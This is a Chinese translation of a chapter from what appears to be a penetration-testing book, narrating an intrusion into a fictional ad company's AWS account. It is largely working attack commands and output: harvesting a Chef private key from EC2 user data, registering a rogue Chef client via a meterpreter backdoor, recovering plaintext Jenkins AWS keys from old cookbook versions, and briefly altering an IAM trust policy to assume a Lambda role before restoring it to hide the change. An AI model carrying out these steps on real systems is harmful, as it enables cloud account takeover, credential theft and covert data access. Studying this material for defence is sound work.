# 第十章：内在的敌人

![](img/chapterart.png)

在上一章中，我们接管了 MXR Ads 的交付集群。这为我们提供了数百个密钥，从 AWS 访问密钥到 GitHub 令牌，几乎可以访问参与广告交付的任何数据库。我们还不是 AWS 账户的管理员，但离成为管理员只有一步之遥。我们需要整理所有收集到的数据，并利用这些数据找到提升权限的方法，甚至可能揭示 MXR Ads 与 Gretsch Politico 之间的隐藏联系。

## 成神之路

我们加载了从 Kube 获取的 AWS 访问密钥，并检查了一个随机用户的权限。例如，第八章中的 Kevin 就是一个很好的目标：

```
root@Point1:~/# aws iam get-user --profile kevin
"User": {
   "UserName": "kevin.duncan",
`--snip--`
```

我们知道，默认情况下，IAM 用户在 AWS 上没有任何权限。他们甚至无法更改自己的密码。因此，公司通常会为用户在处理用户和权限的 IAM 服务上授予足够的权限，以执行基本操作，如更改密码、列出策略、启用多因素认证等。

为了限制这些权限的范围，管理员通常会添加条件，要求 IAM API 调用仅针对调用用户。例如，Kevin 可能被允许列出自己的权限，但不能列出其他用户的权限：

```
root@Point1:~/# aws iam list-attached-user-policies \
**--user-name=kevin.duncan \**
**--profile kevin**

"PolicyArn": "arn:aws:iam::886371554408:policy/mxrads-self-manage",
"PolicyArn": "arn:aws:iam::886371554408:policy/mxrads-read-only",
"PolicyArn": "arn:aws:iam::886371554408:policy/mxrads-eks-admin"
```

确实，当我们对 Kevin 以外的资源调用 IAM 命令时，就会出现错误，情况如下：

```
root@Point1:~/# aws iam get-policy \
**--policy-arn mxrads-self-manage \**
**--profile kevin**

An error occurred (AccessDenied) when calling the GetPolicy operation:
User: arn:aws:iam::886371554408:user/kevin.duncan is not authorized to
perform: iam:GetPolicy on resource: policy
arn:aws:iam::886371554408:policy/mxrads-eks-admin...
```

AWS 在访问权限方面严格把控。幸运的是，Kevin 的策略名称足够明确，我们可以猜测它们的内容：mxrads-eks-admin 表明 Kevin 是 EKS 的管理员，mxrads-read-only 可能赋予 Kevin 只读权限，涉及 MXR Ads 使用的 165 个 AWS 服务中的一部分。现在的问题只是尝试推测具体是哪一部分。最后一个策略，mxrads-self-manage，应该包含 Kevin 管理其账户的权限集。

每个服务可能需要几个小时，甚至几天，才能完全探索，尤其是对于一个如此依赖 AWS 且业务架构复杂的公司。我们需要保持专注：我们在寻找任何与 Gretsch Politico 相关的信息——特别是关于他们的客户或数据分析活动的信息。这可能表现为一个存储 *数字广告评级 (DAR)* 段（用于衡量广告活动表现）的 S3 桶，一个 RDS 数据库上的表格，一个在 EC2 上运行的 Web 服务器，一个在 API Gateway 上的代理服务，一个在 AWS 简单队列服务 (SQS) 上的消息队列……这些都可能分布在当前可用的多个 AWS 区域中。是的，我理解并与你分享这种挫败感。

幸运的是，AWS 有一个有用的 API，跨多个资源类型和服务，适用于给定的区域：资源组标记 API。只要对象拥有标签或标识符，该 API 就会返回 S3 存储桶、VPC 终端节点、数据库等。任何具有最基本基础设施管理的公司都会确保对其资源进行标记，哪怕只是为了计费目的，因此我们可以相当有信心这个 API 返回的结果是准确且全面的。我们首先列出*eu-west-1*区域的资源，如列表 10-1 所示。

```
root@Point1:~/# aws resourcegroupstaggingapi get-resources \
**--region eu-west-1 \**
**--profile kevin > tagged_resources_euw1.txt**

root@Point1:~/# head tagged_resources_euw1.txt

ResourceARN: arn:aws:ec2:eu-west-1:886371554408:vpc/vpc-01e638,
Tags: [ "Key": "Name", "Value": "privateVPC"]
--`snip`--
arn:aws:ec2:eu-west-1:886371554408:security-group/sg-07108...
arn:aws:lambda:eu-west-1:886371554408:function:tag_index
arn:aws:events:eu-west-1:886371554408:rule/asg-controller3
arn:aws:dynamodb:eu-west-1:886371554408:table/cruise_case
`--snip--`
```

列表 10-1：列出`eu-west-1`的资源

如果 Kevin 没有列出资源标签（`tag:GetResources`）的必要权限，我们只能手动开始探索最常用的 AWS 服务，如 EC2、S3、Lambda、RDS、DynamoDB、API Gateway、ECR、KMS 和 Redshift。*Redshift*是一个优化用于分析的托管 PostgreSQL，*DynamoDB*是一个托管的非关系型数据库，模仿 MongoDB，*API Gateway*是一个托管代理，转发请求到你选择的后端，*Lambda*是一个在 AWS 自己的实例上运行你代码的服务（稍后会详细介绍）。这些基础服务甚至被 AWS 自身用于构建更复杂的服务，如 EKS，实际上它不过是 EC2、ECR、API Gateway、Lambda、DynamoDB 和其他服务的组合。

从列表 10-1 中，我们从 MXR Ads 的账户中提取了超过 8,000 个标记资源，因此我们自然会转向我们信赖的`grep`命令来查找有关 GP 的引用：

```
root@Point1:~/# egrep -i "gretsch|politico|gpoli" tagged_resources_euw1.txt

ResourceARN: arn:aws:lambda:eu-west-1:886477354405:function:dmp-sync-gretsch-politico,
`--snip--`
```

太棒了！我们的隐藏线索在这里。MXR Ads 有一个 Lambda 函数，似乎与 Gretsch Politico 交换数据。AWS Lambda 是无服务器世界中的黄金标准。你将 Python 源代码、Ruby 脚本或 Go 二进制文件打包成 ZIP 文件，连同一些环境变量和 CPU/内存配置一起发送到 AWS Lambda，AWS 会为你运行它。

这个过程不涉及机器配置、systemd 设置和 SSH。你只需指定一个 ZIP 文件，它会在你选择的时间执行。Lambda 函数甚至可以由其他 AWS 服务触发的外部事件启动，比如 S3 上的文件接收。Lambda 是一个被美化的 crontab，改变了人们编排工作负载的方式。

让我们仔细看一下这个`dmp-sync` Lambda 函数（参见列表 10-2）。

```
root@Point1:~/# aws lambda get-function  \
**--function-name dmp-sync-gretsch-politico \**
**--region eu-west-1 \**
**--profile kevin**

`--snip--`
RepositoryType: S3,
Location: https://mxrads-lambdas.s3.eu-west-1.amazonaws.com/functions/dmp-sync-gp?versionId=YbSa...
```

列表 10-2：`dmp-sync` Lambda 函数的描述

我们在列表 10-2 中看到，Lambda 函数从 S3 路径*mxrads-lambdas/dmp-sync-gp*中获取它需要执行的编译代码。我们立刻冲向键盘，开始输入下一个命令：

```
root@Point1:~/# aws s3api get-object \
**--bucket mxrads-lambdas \**
**--key functions/dmp-sync-gp dmp-sync-gp \**
**--profile kevin**

An error occurred (AccessDenied) when calling the GetObject operation:
Access Denied
```

但遗憾的是，Kevin 没有足够的权限来访问这个存储桶。过去几天我们收到的“访问被拒绝”信息多得足以堆成一堵墙。

相反，我们更仔细地查看 Lambda 定义，发现它模拟了 AWS 角色`lambda-dmp-sync`，并依赖几个环境变量来执行其任务（参见清单 10-3）。

```
root@Point1:~/# aws lambda get-function \
**--function-name dmp-sync-gretsch-politico \**
**--region eu-west-1 \**
**--profile kevin**

`--snip--`
Role: arn:aws:iam::886371554408:role/lambda-dmp-sync,
Environment: {
   Variables: {
     1 SRCBUCKET: mxrads-logs,
     2 DSTBUCKET: gretsch-streaming-jobs,
      SLACK_WEBHOOK: AQICAHajdGiAwfogxzeE887914...,
      DB_LOGS_PASS: AQICAHgE4keraj896yUIeg93GfwEnep...
`--snip--`
```

清单 10-3：`dmp-sync` Lambda 函数的配置

这些设置表明代码处理的是 MXR Ads 的日志 1，并且可能会在将其发送到 Gretsch Politico 的 S3 桶 2 之前，用与投放活动相关的额外信息填充这些日志。

我们发现这个 GP 桶是一个外部桶，因为它不出现在我们当前的 MXR Ads 桶列表中。不用说，我们当前的访问密钥根本无法列出这个外部桶，但我们知道与 Lambda（`lambda-dmp-sync`）相关联的角色可以。问题是，我们如何模拟这个角色呢？

一种可能的方式是通过获取包含此 Lambda 函数源代码的 GitHub 仓库来模拟 Lambda 角色——假设我们能找到一个具有读写权限的账户。然后，我们可以偷偷地将几行代码加入其中，在运行时获取角色的访问密钥，并用它们读取桶中的内容。这很诱人，但该过程存在显著风险。通过 Slack 通知和 GitHub 邮件，最小的提交都可能广播给整个技术团队。显然，这并不是理想的选择。

AWS 确实提供了一种通过 STS API 模拟任何角色的自然方式，但，天哪，我们需要一些权限才能调用此命令。没有理智的管理员会将 STS API 包括在分配给开发人员的只读策略中。

让我们暂时放下模拟角色的想法，继续探索其他 AWS 服务。肯定有我们可以利用的服务来提升权限。

让我们检查一下 EC2 服务，并描述所有运行的实例（参见清单 10-4）。还记得我们在第八章尝试时，受限于 Kubernetes 节点吗？感谢 Kevin 的广泛只读权限，这些限制已经被解除。

```
root@Point1:~/# aws ec2 describe-instances \
**--region=eu-west-1 \**
**--profile kevin > all_instances_euw1.txt**

root@Point1:~/# head all_instances_euw1.txt
--`snip`--
"InstanceId": "i-09072954011e63aer",
"InstanceType": "c5.4xlarge",
"Key": "Name",  "Value": "cassandra-master-05789454"

"InstanceId": "i-08777962411e156df",
"InstanceType": "m5.8xlarge",
"Key": "Name",  "Value": "lib-jobs-dev-778955944de"

"InstanceId": "i-08543949421e17af",
"InstanceType": "c5d.9xlarge",
"Key": "Name",  "Value": "analytics-tracker-master-7efece4ae"

`--snip--`
```

清单 10-4：描述`eu-west-1`的 EC2 实例

我们发现，仅在`eu-west-1`区域就有接近 2,000 台机器——几乎是 Kubernetes 生产集群所处理的三倍。MXR Ads 几乎没有深入使用 Kube；它还没有迁移其余的工作负载和数据库。

在这 2,000 台机器中，我们需要选择一个目标。让我们不考虑业务应用程序；我们通过艰难的经验学到，MXR Ads 严格限制了其 IAM 角色。最开始，我们在进行基本侦查时，每次获取访问权限都非常困难。不，若要完全控制 AWS，我们需要接管一款基础设施管理工具。

## 自动化工具接管

即使有 AWS 提供的所有自动化工具，没有一支团队能够在没有广泛工具集的帮助下管理 2000 台服务器和数百个微服务，而这些工具集需要调度、自动化和标准化操作。我们正在寻找像 Rundeck、Chef、Jenkins、Ansible、Terraform、TravisCI 或任何其他数百种 DevOps 工具中的某一个。

Terraform 帮助追踪在 AWS 上运行的组件，Ansible 配置服务器并安装所需的软件包，Rundeck 在数据库之间调度维护任务，而 Jenkins 则构建应用程序并将其部署到生产环境中。随着公司规模的扩大，它需要一套稳固的工具和标准来支持和推动这种增长。我们正在浏览运行机器的列表，寻找工具名称：

```
root@Point1:~/# egrep -i -1 \
**"jenkins|rundeck|chef|terraform|puppet|circle|travis|graphite" all_instances_euw1.txt**

"InstanceId": "i-09072954011e63aer",
"Key": "Name",  "Value": "jenkins-master-6597899842"
PrivateDnsName": "ip-10-5-20-239.eu-west-1.compute.internal"

"InstanceId": "i-08777962411e156df",
"Key": "Name",  "Value": "chef-server-master-8e7fea545ed"
PrivateDnsName": "ip-10-5-29-139.eu-west-1.compute.internal"

"InstanceId": "i-08777962411e156df",
"Key": "Name",  "Value": "jenkins-worker-e7de87adecc"
PrivateDnsName": "ip-10-5-10-58.eu-west-1.compute.internal"

`--snip--`
```

太棒了！我们找到了关于 Jenkins 和 Chef 的信息。让我们聚焦这两个组件，因为它们具有巨大的潜力。

### Jenkins 万能

Jenkins 是一款复杂的软件，可以承担多种角色。例如，开发者可以使用它以自动化方式编译、测试和发布他们的代码。为此，当一个新文件被推送到仓库时，GitHub 会触发一个 POST 请求（webhook）到 Jenkins，后者会对新推送的应用版本进行端到端测试。一旦代码合并，Jenkins 会自动触发另一个作业，将代码部署到生产服务器。这一过程通常被称为*持续* *集成/持续交付 (CI/CD)*。

另一方面，管理员可以用它来执行某些基础设施任务，如创建 Kubernetes 资源或在 AWS 上生成新机器。数据科学家可能会安排他们的工作负载，从数据库中提取数据，进行转换，然后推送到 S3。企业界的使用场景非常丰富，只受 DevOps 从业人员的想象力（有时也受限于清醒程度）限制。

像 Jenkins 这样的工具，实际上是推动并实现 DevOps 思想中那些理想化的理念的代理。的确，对于每家公司来说，从零开始实现像持续测试和交付这样复杂的系统几乎是不可能的。对每一个细小操作的近乎病态的自动化痴迷，使得像 Jenkins 这样的工具从简单的测试框架，逐渐发展成任何基础设施中的至高神明。

由于 Jenkins 需要动态地测试和构建应用程序，因此通常会有一个 GitHub token 存储在某个磁盘位置。它还需要将应用程序和容器部署到生产环境中，因此管理员通常会将包含 ECR、EC2 以及可能的 S3 写权限的 AWS 访问密钥添加到 Jenkins 配置文件中。管理员还希望利用 Jenkins 执行 Terraform 命令，而 Terraform 本身完全控制 AWS。现在，Jenkins 也拥有这种控制权。而且由于 Terraform 是由 Jenkins 作业管理的，为什么不将 Kubernetes 命令也添加进去，以便集中管理操作呢？来吧，给我获取那些集群管理员权限，Jenkins 需要它们。

如果没有密切监控，这些 CI/CD 管道——在这种情况下是 Jenkins——很快就会发展成复杂网络的交汇点，基础设施神经纤维的交织处，如果被轻柔而熟练地刺激，可能会导致狂喜——而这正是我们要做的。

我们坦率地尝试直接访问 Jenkins 而不进行身份验证。Jenkins 默认监听在 8080 端口，所以我们使用现有的 meterpreter shell 向服务器发出 HTTP 查询：

```
# Our backdoored pod on the Kubernetes cluster

meterpreter > **execute curl -I -X GET -D http://ip-10-5-20-239.eu-west-1.compute.internal:8080**

HTTP/1.1 301
Location: https://www.github.com/hub/oauth_login
content-type: text/html; charset=iso-8859-1
`--snip--`
```

我们会立即被拒绝。这完全正常，毕竟，任何依赖这种关键组件进行交付的合格公司都会采取最低限度的保护措施。通往 Jenkins 的道路并不是从正门，而是通过小巷窗口中的一个小缝隙：那个可能最初帮助设置 Jenkins 的 Chef 服务器。

### 地狱厨房

Chef，像 Ansible 一样，是一个软件配置工具。你将一台新安装的机器注册到 Chef，然后它会拉取并执行一组预定义的指令，自动设置机器上的工具。例如，如果你的机器是一个 web 应用，Chef 会安装 Nginx，设置 MySQL 客户端，复制 SSH 配置文件，添加管理员用户，并安装任何其他所需的软件。

配置指令用 Ruby 编写，并按 Chef 的说法分组为所谓的 cookbook 和 recipe。列表 10-5 是一个 Chef 配方的例子，它创建了一个 config.json 文件并将用户添加到 *docker* 组。

```
# recipe.rb

# Copy the file seed-config.json on the new machine
cookbook_file config_json do
  source 'seed-config.json'
  owner 'root'
end

# Append the user admin to the docker group
group 'docker' do
    group_name 'docker'
    append  true
    members 'admin'
    action  :manage
end
`--snip--`
```

列表 10-5：一个 Chef 配方，它创建一个 *config.json* 文件并将用户添加到 *docker* 组

密码和密钥是任何服务器配置中的关键元素——尤其是像 Jenkins 这样，由于其设计的性质，几乎与基础设施的每个组件都有交互的服务器。没错，我说的就是 Jenkins！

如果你严格遵循良好的 DevOps 实践，一切都应该是自动化的、可重复的，更重要的是，有版本控制。你不能手动安装 Jenkins 或任何其他工具。你必须使用像 Chef 或 Ansible 这样的管理工具来描述你的 Jenkins 配置，并将其部署到一台全新的机器上。对这个配置的任何更改，比如升级插件或添加用户，都应该通过这个管理工具，它会跟踪、版本控制并测试这些更改，然后再将其应用到生产环境中。这就是基础设施即代码的本质。开发人员最喜欢的代码版本控制系统是什么？当然是 GitHub！

我们可以通过列出 MXR Ads 的所有私有仓库，并查找任何提到 Jenkins 相关的 Chef cookbook，快速验证 Chef 配方是否存储在 GitHub 上以供此任务使用。记住，我们已经有一个有效的 GitHub token，得益于 Kubernetes。我们首先提取仓库列表：

```
# list_repos.py
from github import Github
g = Github("9c13d31aaedc0cc351dd12cc45ffafbe89848020")
for repo in g.get_user().get_repos():
    print(repo.name, repo.clone_url)
```

然后我们搜索 *cookbook*、*Jenkins*、*Chef*、*recipe* 等关键字的引用（见 列表 10-6）。

```
root@Point1:~/# python3 list_repos.py > list_repos.txt
root@Point1:~/# egrep -i "cookbook|jenkins|chef" list_repos.txt
cookbook-generator https://github.com/mxrads/cookbook-generator.git
cookbook-mxrads-ami https://github.com/mxrads/cookbook-ami.git
1 cookbook-mxrads-jenkins-ci https://github.com/mxrads/cookbook-jenkins-ci.git
--`snip`--
```

列表 10-6：符合至少一个关键字*cookbook*、*Jenkins*和*Chef*的 MXR Ads 仓库列表

命中 1！我们下载了 cookbook-mxrads-jenkins-ci 仓库：

```
root@Point1:~/# git clone https://github.com/mxrads/cookbook-jenkins-ci.git
```

然后我们通过源代码，希望找到一些硬编码的凭据：

```
root@Point1:~/# egrep -i "password|secret|token|key" cookbook-jenkins-ci

default['jenkins']['keys']['operations_redshift_rw_password'] = 'AQICAHhKmtEfZEcJQ9X...'
default['jenkins']['keys']['operations_aws_access_key_id'] = 'AQICAHhKmtEfZEcJQ9X...'
default['jenkins']['keys']['operations_aws_secret_access_key'] = 'AQICAHhKmtEfZEcJQ9X1w...'
default['jenkins']['keys']['operations_price_cipher_crypto_key'] = 'AQICAHhKmtEfZE...'
```

我们发现，约有 50 个密钥在一个方便的文件*secrets.rb*中定义，但不要急于兴奋。这些可不是普通的明文密码。它们的开头都以六个魔法字母`AQICAH`开头，这表明它们使用了 AWS KMS，这是 AWS 提供的密钥管理服务，用于加密/解密静态数据。访问它们的解密密钥需要特定的 IAM 权限，而我们的用户 Kevin 很可能没有这些权限。该 cookbook 的 README 文件对密钥管理有明确说明：

```
# README.md

KMS Encryption :

Secrets must now be encrypted using KMS. Here is how to do so.
Let's say your credentials are in /path/to/credentials...
```

我最喜欢的那个句子中的关键字是“现在”。这表明不久前，密钥的处理方式可能与现在不同，可能根本没有加密。我们查看了 Git 提交历史：

```
root@Point1:~/# git rev-list --all | xargs git grep "aws_secret"

e365cd828298d55...:secrets.rb:
default['jenkins']['keys']['operations_aws_secret_access_key'] = 'AQICAHhKmtEfZEcJQ9X1w...'

623b30f7ab4c18f...:secrets.rb:
default['jenkins']['keys']['operations_aws_secret_access_key'] = 'AQICAHhKmtEfZEcJQ9X1w...'
```

一定有人对它进行了彻底清理。所有之前版本的*secrets.rb*都包含相同的加密数据。

没关系。GitHub 并不是唯一一个存储 cookbooks 的版本化仓库。Chef 有自己的本地数据存储库，用于存储其资源的不同版本。运气好的话，也许我们可以下载一个包含明文凭据的早期版本的 cookbook。

与 Chef 服务器的通信通常是经过充分保护的。每台由 Chef 管理的服务器都会获得一个专用的私钥，用于下载 cookbooks、策略和其他资源。管理员还可以使用 API 令牌来执行远程任务。

然而，值得庆幸的是，资源之间没有隔离。我们所需要的只是一个有效的私钥，哪怕是属于某个虚拟测试服务器的私钥，也能读取 Chef 上曾存储过的每个 cookbook 文件。生活不就是信任吗！

那个私钥应该不难找到。我们可以读取 EC2 API，涉及约 2,000 台服务器。肯定有一台服务器的用户数据中硬编码了 Chef 私钥。我们只需要执行 2,000 次 API 调用。

起初看似繁琐且细致的任务其实可以轻松自动化。多亏了存储在 MXR Ads GitHub 仓库中的 cookbooks，我们已经知道哪些服务依赖于 Chef：Cassandra（NoSQL 数据库）、Kafka（流处理软件）、Jenkins、Nexus（代码仓库）、Grafana（仪表板和度量）等。

我们将这些服务名称作为关键字存储在文件中，然后将它们输入到一个循环中，从中获取带有匹配关键字标签名称的实例，如下所示。我们提取每个机器池中每个服务的第一个实例 ID，因为例如，所有 Cassandra 机器可能共享相同的用户数据，所以我们只需要一个实例：

```
root@Point1:~/# while read p; do
 **instanceID=$(aws ec2 describe-instances \**
 **--filter "Name=tag:Name,Values=*$p*" \**
 **--query 'Reservations[0].Instances[].InstanceId' \**
 **--region=eu-west-1 \**
 **--output=text)**
 **echo $instanceID > list_ids.txt**
**done <services.txt**
```

这种相对临时的采样方法让我们得到了大约 20 个实例 ID，每个 ID 对应一台承载不同服务的机器：

```
root@Point1:~/# head list_ids.txt
i-08072939411515dac
i-080746959025ceae
i-91263120217ecdef
`--snip--`
```

我们循环遍历这个文件，调用`ec2 describe-instance-attribute` API 来获取用户数据，解码并将其存储到文件中：

```
root@Point1:~/# while read p; do
 **userData=$(aws ec2 describe-instance-attribute \**
 **--instance-id $p \**
 **--attribute userData \**
 **--region=eu-west-1 \**
 **| jq -r .UserData.Value | base64 -d)**
 **echo $userData > $p.txt**
**done <list_ids.txt**
```

我们检查创建了多少个文件，并确认这些文件包含用户数据脚本：

```
root@Point1:~/# ls -l i-*.txt |wc -l
21
root@Point1:~/# cat i-08072939411515dac.txt
encoding: gzip+base64
  path: /etc/ssh/auth_principals/user
  permissions: "0644"
- content: |-
    #!/bin/bash
`--snip--`
```

完美。现在到了关键时刻。这些出色的服务器中有哪一台在其用户数据中声明了 Chef 私钥？我们寻找“RSA PRIVATE KEY”关键字：

```
root@Point1:~/# grep -7 "BEGIN RSA PRIVATE KEY" i-*.txt
`--snip--`
1 cat << EOF
chef_server_url 'https://chef.mxrads.net/organizations/mxrads'
validation_client_name 'chef-validator'
EOF
)> /etc/chef/client.rb

`--snip--`
2 cat << EOF
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqg/6woPBdnwSVjcSRQenRJk0MePELfPp
`--snip--`
)> /etc/chef/validation.pem
```

这几乎太简单了。第一段代码定义了 Chef 使用的关键参数，并将其存储在 *client.rb* 文件中。第二段代码将私钥写入名为 *validation.pem* 的文件。

这个私钥与我们希望获得的不同，但我们会让它发挥作用。我们获得的密钥是一个验证密钥，它是 *chef-validator* 用户的私钥，分配给实例以建立它们与 Chef 服务器的第一次联系。*chef-validator* 不允许列出机器、食谱或执行其他敏感操作，但它拥有注册客户端（机器）的最终权限，最终授予它们可以执行上述操作的私钥。事事顺利，最终大功告成。

这个用户的私钥在所有希望加入 Chef 服务器的实例之间共享。所以，自然地，我们也可以使用它注册一台额外的机器，并获得我们自己的私钥。我们只需要模拟一个真实的客户端配置，并在 VPC 内部向 Chef 服务器请求。

我们创建所需的文件来启动机器注册——*client.rb* 1 和 *validation.pem* 2——并将从用户数据脚本中收集到的数据填充到这些文件中，如下所示。这只是懒惰的复制粘贴而已：

```
meterpreter > **execute -i -f cat << EOF**
chef_server_url 'https://chef.mxrads.net/organizations/mxrads'
validation_client_name 'chef-validator'
EOF
)> /etc/chef/client.rb

meterpreter > **execute -i -f cat << EOF**
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqg/6woPBdnwSVjcSRQenRJk0MePELfPp
`--snip--`
)> /etc/chef/validation.pem
```

然后，我们从我们的后门中下载并执行 Chef 客户端，启动我们的机器注册过程：

```
meterpreter > **execute -i -f apt update && apt install -y chef**
meterpreter > **execute -i -f chef-client**

Starting Chef Client, version 14.8.12
Creating a new client identity for aws-node-78ec.eu-west-1.compute.internal
using the validator key.

Synchronizing Cookbooks:
Installing Cookbook Gems:
Compiling Cookbooks...
Running handlers complete
Chef Client finished, 0/0 resources updated in 05 seconds

meterpreter > **ls /etc/chef/**

client.pem client.rb validation.pem
```

就是这样。我们完成了。我们偷偷将一台新机器加入了 Chef 服务器的目录，并收到了一个名为 *client.pem* 的新私钥。

`chef-client` 可执行文件负责处理机器的状态，包括应用相关的食谱、注册机器等。为了探索在 Chef 服务器上定义的资源，我们需要使用 `knife` 工具。它是 Chef 标准包的一部分，但需要一个小的配置文件才能正常运行。下面是一个配置文件示例，基于之前执行的 `chef-client` 命令的输出（用来获取机器的名称）和 *client.rb* 配置：

```
# ~/root/.chef/knife.rb
node_name       'aws-node-78ec.eu-west-1.compute.internal'
client_key      '/etc/chef/client.pem'
chef_server_url 'https://chef.mxrads.net/organizations/mxrads'
knife[:editor] = '/usr/bin/vim'
```

配置好 `knife` 后，让我们使用它列出 Chef 服务器的食谱目录：

```
meterpreter > **knife cookbooks list**
apt                         7.2.0
ark                         4.0.0
build-essential             8.2.1
jenkins-ci                  10.41.5
`--snip--`
```

太棒了，我们亲爱的 jenkins-ci 食谱就在这里。让我们仔细看看这个食谱的版本历史：

```
meterpreter > **knife cookbooks show jenkins-ci**
10.9.5 10.9.4 10.9.4 10.9.3 10.9.2 10.9.1 10.9.8 10.9.7...
4.3.1 4.3.0 3.12.9 3.11.8 3.11.7 3.9.3 3.9.2 3.9.1
```

我们可以看到，狡猾的 Chef 服务器保存了超过 50 个版本的食谱，从 10.9.5 一直到 3.9.1。现在，我们需要找到带有明文凭证的最新食谱——理想情况下，是在切换到 KMS 之前的版本。

我们开始检查不同的版本，从最新版本开始，经过几次尝试后，我们最终找到了 10.8.6 版本的食谱：

```
meterpreter > **knife cookbooks show jenkins-ci 10.8.6**
attributes:
  checksum:    320a841cd55787adecbdef7e7a5f977de12d30
  name:        attributes/secrets.rb
  url:         https://chef.mxrads.net:443/bookshelf/organization-
26cbbe406c5e38edb280084b00774500/checksum-320a841cd55787adecbdef7e7a5f977de12d30?AWSAccessKeyId=25ecce65728a200d6de4bf782ee0a5087662119
&Expires=1576042810&Signature=j9jazxrJjPkHQNGtqZr1Azu%2BP24%3D
--`snip`--
meterpreter > **curl https://chef.mxrads.net:443/bookshelf/org...**

1'AWS_JENKINS_ID' => 'AKIA55ZRK6ZS2XX5QQ4D',
  'AWS_JENKINS_SECRET' => '6yHF+L8+u7g7RmHcudlCqWIg0SchgT',
`--snip--`
```

我的天，我们找到了！Jenkins 自己的 AWS 访问密钥以明文形式存储 1。如果这个小家伙不是 AWS 账户的管理员，那我真不知道谁能是了。

在列表 10-7 中，我们通过链式调用几个 AWS API 来获取与这些凭证关联的 IAM 用户名、其附加的策略、最新版本，最后是它们的内容。

```
root@Point1:~/# vi ~/.aws/credentials
[jenkins]
aws_access_key_id = AKIA55ZRK6ZS2XX5QQ4D
aws_secret_access_key = 6yHF+L8+u7g7RmHcudlCqWIg0SchgT

# get username
root@Point1:~/# aws iam get-user --profile jenkins
"UserName": "jenkins"

# list attached policies
root@Point1:~/# aws iam list-attached-user-policies \
**--user-name=jenkins \**
**--profile jenkins**

"PolicyName": "jenkins-policy",
"PolicyArn": "arn:aws:iam::aws:policy/jenkins-policy"

# get policy version
root@Point1:~/# aws iam iam get-policy \
**--policy-arn arn:aws:iam::886371554408:policy/jenkins-policy \**
**--profile jenkins**

"DefaultVersionId": "v4",

# get policy content

root@Point1:~/# aws iam iam get-policy-version \
**--policy-arn arn:aws:iam::886371554408:policy/jenkins-policy \**
**--version v4 \**
**--profile jenkins**
`--snip--`
"Action": [
        "iam:*",
        "ec2:*",
        "sts:*",
        "lambda:*",
         . . .
         ],
        "Resource": "*"
`--snip--`
```

列表 10-7：获取授予 Jenkins 账户的访问权限

看看策略输出中的所有星号。星星。到处都是星星。真的是。Jenkins 可以访问 MXR Ads 使用的每一个 AWS 服务，从 IAM 到 Lambda 以及更多。我们终于对 MXR Ads 的 AWS 账户拥有了完全且无可争议的控制权。

## 接管 Lambda

我们回到最初激发这个冒险的目标：假扮附加到 Lambda 函数`dmp-sync`的 IAM 角色，它将数据复制到 Gretsch Politico。

现在我们拥有了对 IAM 服务的无限访问权限，让我们来探索这个 Lambda 的角色（见列表 10-8）。

```
root@Point1:~/# export AWS_PROFILE=jenkins
root@Point1:~/# aws iam get-role lambda-dmp-sync
 "RoleName": "dmp-sync",
 "Arn": "arn:aws:iam::886371554408:role/dmp-sync",
 "AssumeRolePolicyDocument": {
     "Version": "2012-10-17",
     "Statement": [{
          "Effect": "Allow",
          "Principal": {
 "Service": "lambda.amazonaws.com"
           },
              "Action": "sts:AssumeRole"
      }]
`--snip--`
```

列表 10-8：`lambda-dmp-sync`角色的 IAM 角色策略

`AssumeRolePolicyDocument`属性指定了哪些实体被允许假扮给定角色。请注意，唯一被信任来假扮此角色的实体是 AWS Lambda 服务本身（[lambda.amazonaws.com](http://lambda.amazonaws.com)）。为了正确地假扮这个角色，我们需要注册一个新的 Lambda，将其分配给这个新角色，并执行我们喜欢的任何代码。或者，我们也可以更新当前 Lambda 的代码来执行我们的命令。

第三种选择，可能是最简单的一种选择，就是临时更新角色的策略，将 Jenkins 用户包括在内。这个变更不能持续太久，因为在这个特定时间窗口内执行`terraform plan`的任何人都会注意到额外的账户，可能会引起一些怀疑。因此，我们需要迅速行动。我们将修改“假设角色”策略，生成有效期为 12 小时的临时凭证，然后恢复原始策略。完成所有操作的时间不到一秒钟。

在列表 10-9 中，我们将当前角色策略保存到一个文件，并偷偷插入一行`"AWS": "arn:aws:iam::886371554408:user/jenkins"`，以便将 Jenkins 添加为受信任的用户。

```
{
  "Version": "2012-10-17",
  "Statement": [{
     "Effect": "Allow",
     "Principal": {
        "Service": "lambda.amazonaws.com",
        "AWS": "arn:aws:iam::886371554408:user/jenkins"
     },
     "Action": "sts:AssumeRole"
  }]
}
```

列表 10-9：允许 Jenkins 假扮 Lambda 所用 IAM 角色的 IAM 角色策略

我们提交这个新角色策略，并迅速发出`assume-role` API 调用，获取临时凭证来假扮`lambda-dmp-sync`角色：

```
 root@Point1:~/# aws iam update-assume-role-policy \
**--role-name lambda-dmp-sync \**
**--policy-document file://new_policy.json**

root@Point1:~/# aws sts assume-role \
**--role-arn arn:aws:iam::886371554408:user/lambda-dmp-sync \**
**--role-session-name AWSCLI-Session \**
**--duration-seconds 43200**

"AccessKeyId": "ASIA44ZRK6WSZAFXRBQF",
"SecretAccessKey": "nSiNoOEnWIm8h3WKXqgRG+mRu2QVN0moBSTjRZWC",
"SessionToken": "FwoGZXIvYXdzEL///...
"Expiration": "2019-12-12T10:31:53Z"
```

好的。这些临时凭证将在 12 小时内有效，即使 Jenkins 不再在信任策略中。最后，我们恢复原始策略，以避免任何怀疑：

```
root@Point1:~/# aws iam update-assume-role-policy \
**--role-name lambda-dmp-sync \**
**--policy-document file://old_policy.json\**
**--profile jenkins**
```

我们将新密钥加载到 AWS CLI 中，继续探索 Gretsch Politico 的桶 gretsch-streaming-jobs（列表 10-10）。这就是前面章节中提到的`dmp-sync` Lambda 使用的桶。

```
root@Point1:~/# vi ~/.aws/credentials
[dmp-sync]
aws_access_key_id = ASIA44ZRK6WSZAFXRBQF
aws_secret_access_key = nSiNoOEnWIm8h3WKXqgRG+mRu2QVN0moBSTjRZWC
aws_session_token = FwoGZXIvYXdzEL//...

root@Point1:~/# aws s3api list-objects-v2 \
**--bucket gretsch-streaming-jobs \**
**--profile dmp-sync > list_objects_gp.txt**

root@Point1:~/# head list_objects_gp.txt

"Key": "rtb-bid-resp/2019/12/11/10/resp-0-141d08-ecedade-123...",
"Key": "rtb-bid-resp/2019/12/11/10/resp-0-753a10-3e1a3cb-51c...",
"Key": "rtb-bid-resp/2019/12/11/10/resp-0-561058-8e85acd-175...",
"Key": "rtb-bid-resp/2019/12/11/10/resp-1-091bd8-135eac7-92f...",
